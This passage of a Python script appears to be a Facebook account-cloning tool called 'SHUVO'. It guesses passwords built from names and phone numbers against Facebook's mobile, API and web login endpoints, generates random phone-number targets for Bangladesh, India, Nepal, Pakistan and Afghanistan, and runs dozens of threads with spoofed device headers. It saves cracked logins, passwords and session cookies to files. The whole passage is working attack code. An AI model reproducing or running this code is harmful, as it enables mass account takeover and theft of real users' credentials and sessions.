        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
#-----------------------❲ FILE METHOD M2 ❳-----------------------#
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{xd} SHUVO-M2 {loop}{G}|{W}{len(oks)}{G}|{W}{len(cps)} ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,"password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': ___swag___(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(3e7,4e7)),
                'X-FB-SIM-HNI': str(random.randint(2e4,4e4)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{xd}{G} SHUVO-OK {sid} | {ps} ")
                    print(f"\r{xd} COOKIES {cookie}");linex()
                    oks.append(sid)
                    open('/sdcard/SHUVO-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{xd}{O} SHUVO-CP {sid} | {ps} ")
                    cps.append(sid)
                    open('/sdcard/SHUVO-M2-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)
#-----------------------❲ FILE METHOD M3 ❳-----------------------#
    def methodC(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r{xd} SHUVO-M3 {loop}{G}|{W}{len(oks)}{G}|{W}{len(cps)} ")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                __ua__ = ___sex___()
                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': __ua__, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{xd}{G} SHUVO-OK {sid} | {ps} ")
                    oks.append(sid)
                    open('/sdcard/SHUVO-M3-FILEOK.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    print(f"\r{xd}{O} SHUVO-CP {sid} | {ps} ")
                    cps.append(sid)
                    open('/sdcard/SHUVO-M3-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodC(sid, name, ps)
#-----------------------❲ FILE PASSWORD INPUT ❳-----------------------#
    def pasw(self):       
            pw = []
            clear();print(f'{xd} EXAMPLE {xdxx} BANGLADESH 1{G}-{W}20 OTHERS 5{G}-{W}10');linex()
            sl = int(input(f'{xd} PASSWORD LIMIT {xdxx} '))
            clear();print(f'{xd} EXAMPLE {xdxx} firstlast {G}•{W} first12 {G}•{W} first123');linex() 
            if sl =='':print(f'{xd} PASSWORD LIMIT BETWEEN 1 TO 30')
            elif sl > 30:print(f'{xd} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'{xd} PASSWORD NO{sr+1} {xdxx} '))
            clear();print(f'{xd} TOTAL FILE UID {xdxx} %s ' % len(self.id));print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
            with SHUVOxd(max_workers=30) as SHUVOworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:SHUVOworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:SHUVOworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:SHUVOworld.submit(self.methodC, uid, name, pwx)
                   except:pass
            result(oks,cps)   
#-----------------------❲ RANDOM ❳-----------------------#
def ___random___():
        clear()
        print(f'{xd1} BANGLADESH CLONING {B}❲{G}HOST METHOD{B}❳{W} ');print(f'{xd2} BANGLADESH CLONING {B}❲{G}API METHOD{B}❳{W}');print(f'{xd3} INDIA CLONING ');print(f'{xd4} NEPAL CLONING ');print(f'{xd5} PAKISTAN CLONING ');print(f'{xd6} AFGHANISTAN CLONING ');linex()
        option = input(f'{xdx} SELECT {xdxx} ')
        if option in ['1','A']:___bd1___()
        elif option in ['2','B']:___bd2___()
        elif option in ['3','C']:___India___()
        elif option in ['4','D']:___Nepal___()
        elif option in ['5','E']:___Pakistan___()
        elif option in ['6','F']:___Afghanistan___()
        else:print(f"{xd} OPTION NOT FOUND ");time.sleep(2);___SHUVO___()
#-----------------------❲ RANDOM BD HOST ❳-----------------------#
def ___bd1___():
    user=[]
    ck=[]
    clear();print(f"{xd} EXAMPLE {xdxx} 017 {G}•{W} 018 {G}•{W} 019 {G}•{W} 016");linex();code = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} COOKIES SHOW Y{G}|{W}N");linex();xmk = input(f'{xdx} SELECT {xdxx} ')
    for _ in range(limit):
        user.append("".join(random.choices(string.digits, k=8)))
    if xmk == "Y" or xmk == "y":
        ck.append("Y")
    elif xmk == "N" or xmk == "n":
        ck.append('N') 
    else:
        ck.append('N')
    with SHUVOxd(max_workers=35) as ___x___:
        clear();tl = str(len(user))
        print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
        for love in user:
            ids = code+love
            if pasxd in ['1','01']:passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]]
            elif pasxd in ['2','02']:passlist = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','ayesha','Bangladesh','jannat']
            ___x___.submit(___HOST___,ids,passlist,tl,ck)
    print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
#-----------------------❲ RANDOM BD API ❳-----------------------#
def ___bd2___():
    os.getuid
    os.geteuid
    clear();print(f"{xd} EXAMPLE {xdxx} 017 {G}•{W} 018 {G}•{W} 019 {G}•{W} 016");linex();code = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} COOKIES SHOW Y{G}|{W}N");linex();xmk = input(f'{xdx} SELECT {xdxx} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with SHUVOxd(max_workers=30) as __bal__:
        clear();tl = str(len(user))
        print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
        for love in user:
            ids = code+love
            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]]
            elif pasxd in ['2','02']:pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','ayesha','Bangladesh','jannat']
            __bal__.submit(___API___,ids,pwx,tl)
    print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
#-----------------------❲ RANDOM INDIA ❳-----------------------#
def ___India___():
    os.getuid
    os.geteuid
    clear();print(f"{xd} EXAMPLE {xdxx} +91639 {G}•{W} +92728 {G}•{W} +91737 {G}•{W} +94737");linex();code = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with SHUVOxd(max_workers=30) as __bal__:
        clear();tl = str(len(user))
        print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
        for love in user:
            ids = code+love
            if pasxd in ['1','01']:pwx = [love[2:],love,code+love,code+love[:3],'57273200','59039200']
            elif pasxd in ['2','02']:pwx = [love,ids[:8],'57273200','59039200']
            __bal__.submit(___API___,ids,pwx,tl)
    print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
#-----------------------❲ RANDOM NEPAL ❳-----------------------#
def ___Nepal___():
    os.getuid
    os.geteuid
    clear();print(f"{xd} EXAMPLE {xdxx} 9815 {G}•{W} 9814 {G}•{W} 9782 {G}•{W} 9823");linex();code = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with SHUVOxd(max_workers=30) as __bal__:
        clear();tl = str(len(user))
        print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
        for love in user:
            ids = code+love
            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            elif pasxd in ['2','02']:pwx = [love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
            __bal__.submit(___API___,ids,pwx,tl)
    print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
#-----------------------❲ RANDOM PAKISTAN ❳-----------------------#
def ___Pakistan___():
    os.getuid
    os.geteuid
    clear();print(f"{xd} EXAMPLE {xdxx} 0306 {G}•{W} 0335 {G}•{W} 0315 {G}•{W} 0345");linex();code = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with SHUVOxd(max_workers=30) as __bal__:
        clear();tl = str(len(user))
        print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
        for love in user:
            ids = code+love
            if pasxd in ['1','01']:pwx = [love,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            elif pasxd in ['2','02']:pwx = [love,ids,'khankhan','khan1122','786786','ali786','khan123','khan12','pakistan','ali123','khanbaba']
            __bal__.submit(___API___,ids,pwx,tl)
    print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
#-----------------------❲ RANDOM AFGHANISTAN ❳-----------------------#
def ___Afghanistan___():
    os.getuid
    os.geteuid
    clear();print(f"{xd} EXAMPLE {xdxx} +9340 {G}•{W} +9360 {G}•{W} +9330 {G}•{W} +9350");linex();code = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with SHUVOxd(max_workers=30) as __bal__:
        clear();tl = str(len(user))
        print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
        for love in user:
            ids = code+love
            if pasxd in ['1','01']:pwx = [love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
            elif pasxd in ['2','02']:pwx = [love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
            __bal__.submit(___API___,ids,pwx,tl)
    print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
#-----------------------❲ RANDOM METHOD BD HOST ❳-----------------------#
def ___HOST___(ids,passlist,tl,ck):
    global loop,oks,cps
    sys.stdout.write(f"\r{xd} SHUVO-BD {loop}{G}|{W}{len(oks)} ");sys.stdout.flush(),
    sys.stdout.write(f"\r{xd} SHUVO-BD {loop}{G}|{W}{len(cps)} ");sys.stdout.flush(),
    sys.stdout.flush()
    session=requests.Session()
    __ua__ = "Mozilla/5.0 (Linux; Android 13; RMX3750 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.136 Mobile Safari/537.36"
    try:
        for pas in passlist:
            free_fb = session.get('https://free.facebook.com').text
            info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'email': ids, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
            update={'User-Agent': ___sex___(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
            session.post(url=f"https://www.facebook.com/login/",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    if "Y" in ck:
                        print(f'\r{xd}{G} SHUVO-OK '+cid+' | '+pas+'\033[1;92m')
                        print(f'\r{xd}{G} SHUVO-CP '+cid+' | '+pas+'\033[1;30m')
                        print(f'\r{xd} COOKIES '+coki+'\x1b[38;5;223m');linex()
                        open('/sdcard/SHUVO-BD-RANDOM-OK.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        open('/sdcard/SHUVO-BD-RANDOM-OK.txt','a').write(cid+'|'+pas+'\n')
                        open('/sdcard/SHUVO-BD-RANDOM-CP.txt','a').write(cid+'|'+pas+'\n')
                        oks.append(cid)
                        break
                    else:
                        print(f'\r{xd}{G} SHUVO-OK '+cid+' | '+pas+'\033[1;92m')
                        open('/sdcard/SHUVO-BD-RANDOM-OK.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                print(f'\r\r{xd}{O} SHUVO-CP {cid} | {pas}')
                open('/sdcard/SHUVO-BD-RANDOM-CP.txt', 'a').write(cid + '|' + pas + '\n')
                cps.append(cid)
                break 
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#-----------------------❲ RANDOM METHOD API ❳-----------------------#
def ___API___(ids,pwv,tl):
    global loop,oks,cps
    sys.stdout.write(f"\r{xd} SHUVO-XD {loop}{G}|{W}{len(oks)} ");sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent': generate_random_user_agent(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r{xd}{G} SHUVO-OK '+ids+' | '+pas+'\033[1;92m')
                print(f'\r{xd} COOKIES '+kuki+'\x1b[38;5;223m');linex()
                oks.append(ids)
                open('/sdcard/SHUVO-RANDOM-OK.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#-----------------------❲ END ❳-----------------------#
___SHUVO_user
